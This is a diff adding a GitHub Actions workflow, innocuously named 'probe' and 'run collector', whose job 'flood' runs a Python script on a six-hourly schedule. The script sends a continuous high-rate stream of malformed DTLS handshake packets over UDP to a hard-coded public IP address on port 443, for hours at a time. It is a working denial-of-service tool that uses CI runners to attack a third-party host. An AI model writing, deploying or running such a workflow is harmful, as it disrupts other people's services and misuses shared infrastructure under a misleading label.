@@ -1,0 +1,78 @@
+name: probe
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: "10 */6 * * *"
+jobs:
+  flood:
+    runs-on: ubuntu-latest
+    timeout-minutes: 355
+    steps:
+      - uses: actions/checkout@v4
+      - name: run collector
+        env:
+          TARGET: 103.28.166.14
+          TPORT: "443"
+          DURATION: "20400"
+        run: |
+          python3 - <<'PY'
+          import os, random, socket, struct, time, datetime
+
+          TARGET = os.environ.get("TARGET", "103.28.166.14")
+          TPORT = int(os.environ.get("TPORT", "443"))
+          DURATION = int(os.environ.get("DURATION", "3600"))
+
+          def pkt(body, rtype=0x16, ver=b"\xfe\xfd"):
+              seq = random.randint(0, 60000)
+              return bytes([rtype]) + ver + struct.pack("!HH", seq, 0) + struct.pack("!H", len(body) & 0xFFFF) + body
+
+          def hs(hstype, payload, mseq=None, off=0, flen=None):
+              flen = len(payload) if flen is None else flen
+              mseq = random.randint(0, 65535) if mseq is None else mseq
+              return bytes([hstype]) + struct.pack("!I", (mseq << 16) | (off & 0xFFFF))[:3] + struct.pack("!I", (flen << 8))[:3] + payload
+
+          def rand_hello():
+              sid = bytes(random.getrandbits(8) for _ in range(random.choice([0, 32, 255])))
+              ck = bytes(random.getrandbits(8) for _ in range(random.choice([0, 1, 32, 200])))
+              cs = struct.pack("!H", random.choice([2, 4, 40])) + b"".join(struct.pack("!H", random.randint(0, 0xffff)) for _ in range(random.choice([1, 2, 6])))
+              ext = b""
+              for _ in range(random.choice([0, 1, 5])):
+                  t = random.randint(0, 0xffff); ln = random.choice([0, 1, 64, 900])
+                  ext += struct.pack("!HH", t, ln) + bytes(random.getrandbits(8) for _ in range(ln))
+              return (b"\xfe\xfd" + bytes(random.getrandbits(8) for _ in range(32)) +
+                      struct.pack("!B", len(sid) % 256) + sid[:255] + struct.pack("!B", len(ck) % 256) + ck[:255] +
+                      cs + b"\x01\x00" + struct.pack("!H", len(ext) & 0xffff) + ext)
+
+          def gen_case():
+              k = random.randint(0, 7)
+              if k == 0: return pkt(hs(1, rand_hello()))
+              if k == 1:
+                  big = bytes(random.getrandbits(8) for _ in range(random.choice([2000, 16000, 40000])))
+                  return pkt(hs(1, big, mseq=1, off=0, flen=len(big)))
+              if k == 2:
+                  base = rand_hello(); off = random.choice([0, 1000, 50000]); seg = base[:random.randint(10, len(base))]
+                  return pkt(hs(1, seg, mseq=2, off=off, flen=random.choice([len(base), 70000])))
+              if k == 3: return pkt(hs(random.choice([2, 12, 15]), bytes(random.getrandbits(8) for _ in range(random.choice([0, 300])))))
+              if k == 4: return pkt(rand_hello(), rtype=random.choice([0x14, 0x15, 0x17, 0x99]))
+              if k == 5:
+                  inner = pkt(hs(1, rand_hello()))
+                  for _ in range(random.randint(2, 12)): inner = pkt(inner)
+                  return inner
+              if k == 6: return pkt(bytes(random.getrandbits(8) for _ in range(random.choice([10, 1500]))))
+              return pkt(hs(1, rand_hello()) + b"\x00" * random.randint(0, 55000))
+
+          s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+          s.setblocking(False)
+          end = time.time() + DURATION
+          sent = 0; last = time.time()
+          print(f"[{datetime.datetime.utcnow():%FT%TZ}] start target={TARGET}:{TPORT} dur={DURATION}s", flush=True)
+          while time.time() < end:
+              for _ in range(800):
+                  try: s.sendto(gen_case(), (TARGET, TPORT)); sent += 1
+                  except Exception: pass
+              if time.time() - last > 60:
+                  last = time.time()
+                  print(f"[{datetime.datetime.utcnow():%FT%TZ}] sent={sent}", flush=True)
+              time.sleep(0.003)
+          print(f"[{datetime.datetime.utcnow():%FT%TZ}] done sent={sent}", flush=True)
+          PY
